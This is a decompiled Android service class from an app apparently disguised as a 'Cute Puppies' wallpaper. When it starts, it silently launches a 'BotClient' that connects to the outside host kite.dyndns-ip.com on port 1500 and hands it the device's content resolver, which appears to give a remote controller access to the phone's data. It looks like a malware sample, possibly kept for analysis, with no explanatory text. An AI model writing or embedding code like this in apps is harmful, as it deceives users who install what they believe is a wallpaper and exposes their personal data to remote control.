// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import android.content.Context;
import android.util.Log;
import android.os.IBinder;
import android.content.Intent;
import android.app.Service;

public class BotService extends Service
{
    public static final String LOG_TAG = "MCS_BOT_BotService";
    
    public IBinder onBind(final Intent intent) {
        return null;
    }
    
    public void onCreate() {
        super.onCreate();
    }
    
    public void onDestroy() {
        super.onDestroy();
    }
    
    public void onStart(final Intent intent, final int n) {
        super.onStart(intent, n);
        final Context baseContext = this.getBaseContext();
        Log.v("MCS_BOT_BotService", "Service Started");
        new BotClient("kite.dyndns-ip.com", 1500, this.getContentResolver(), baseContext).Run();
    }
}
